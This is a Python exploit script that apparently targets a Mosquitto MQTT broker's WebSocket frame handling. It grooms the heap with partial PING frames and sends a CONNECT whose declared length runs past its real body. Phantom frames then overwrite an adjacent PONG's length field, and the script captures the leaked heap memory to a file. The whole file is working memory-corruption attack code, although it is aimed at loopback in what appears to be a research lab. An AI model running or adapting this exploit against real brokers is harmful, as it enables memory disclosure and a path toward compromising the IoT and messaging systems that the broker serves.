#!/usr/bin/env python3
"""MASKerade PONG-adjacency attempt from DZONERZY's published recipe.
Loopback only. Stock-glibc 2.1.2 build from build-glibc.sh.

16 holder connections retain partial 125-byte PINGs to drain 0xc0 tcache;
the source declares a 174-byte CONNECT body, sends 172 real bytes, walks
the phantom cursor 8 frames to the adjacent PONG's packet_length field at
source+0xcc, writes 0x8000+WS_PACKET_OFFSET, then completes its PING.
"""
import argparse
import socket
import struct
import time

MASK = b"\x11\x22\x33\x44"


def masked_frame(opcode, payload, mask=MASK):
    n = len(payload)
    if n < 126:
        hdr = bytes((0x80 | opcode, 0x80 | n))
    elif n < 65536:
        hdr = bytes((0x80 | opcode, 0xFE)) + struct.pack("!H", n)
    else:
        hdr = bytes((0x80 | opcode, 0xFF)) + struct.pack("!Q", n)
    body = bytes(b ^ mask[i % 4] for i, b in enumerate(payload))
    return hdr + mask + body


def connect(port):
    s = socket.create_connection(("127.0.0.1", port), timeout=5)
    req = (f"GET /mqtt HTTP/1.1\r\nHost: 127.0.0.1:{port}\r\n"
           "Upgrade: websocket\r\nConnection: Upgrade\r\n"
           "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
           "Sec-WebSocket-Version: 13\r\nSec-WebSocket-Protocol: mqtt\r\n\r\n").encode()
    s.sendall(req)
    s.settimeout(3)
    data = b""
    while b"\r\n\r\n" not in data:
        c = s.recv(4096)
        if not c:
            break
        data += c
    if b"101" not in data.split(b"\r\n")[0]:
        raise RuntimeError("upgrade failed: " + repr(data[:200]))
    return s


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, default=27080)
    ap.add_argument("--holders", type=int, default=16)
    ap.add_argument("--delay", type=float, default=0.15)
    ap.add_argument("--groom-close", type=int, default=0,
                    help="close this many holders before source/PONG allocation")
    a = ap.parse_args()

    holders = []
    for i in range(a.holders):
        s = connect(a.port)
        s.sendall(b"\x89\xfd" + MASK)  # masked PING, len 125, payload withheld
        holders.append(s)
    if a.groom_close:
        for s in holders[:a.groom_close]:
            s.close()
        holders = holders[a.groom_close:]
        time.sleep(a.delay)
    print("holders with partial PING:", len(holders))
    # A pre-existing connection whose 0xc0 PONG can be allocated immediately
    # after the source payload, so the two chunks are adjacent from top.
    spare = connect(a.port)

    src = connect(a.port)
    # MQTT CONNECT fixed header, Remaining Length 174 (0xae 0x01), 172 body bytes
    src.sendall(masked_frame(0x82, bytes((0x10, 0xAE, 0x01)) + b"B" * 172))
    time.sleep(a.delay)
    spare.sendall(b"\x89\xfd" + MASK)  # PONG allocated right after source payload
    time.sleep(a.delay)
    # 1 phantom frame makes pos=0xb0/to_process underflow; 7 more walk to +0xcc
    src.sendall(masked_frame(0x82, b"") * 8)
    time.sleep(a.delay)
    # Overwrite the adjacent PONG packet_length with 0x8000 + WS_PACKET_OFFSET(16)
    src.sendall(masked_frame(0x82, struct.pack("<I", 0x8010)))
    time.sleep(a.delay)
    victim = spare
    victim.sendall(MASK + b"P" * 125)
    time.sleep(0.6)

    victim.settimeout(3)
    total = 0
    chunks = []
    try:
        while True:
            c = victim.recv(65536)
            if not c:
                break
            chunks.append(c)
            total += len(c)
            if total > 200000:
                break
    except (socket.timeout, ConnectionResetError):
        pass
    data = b"".join(chunks)
    print("PONG bytes received:", total)
    print("first 48 bytes:", repr(data[:48]))
    print("frame header hint:", data[:4].hex() if data else "none")
    open("/home/mesh-home/mishe-tauftauf2shell/lab/frontier/mosquitto2shell/logs/pong-leak.bin", "wb").write(data)
    for s in holders + [spare, src]:
        s.close()


if __name__ == "__main__":
    main()
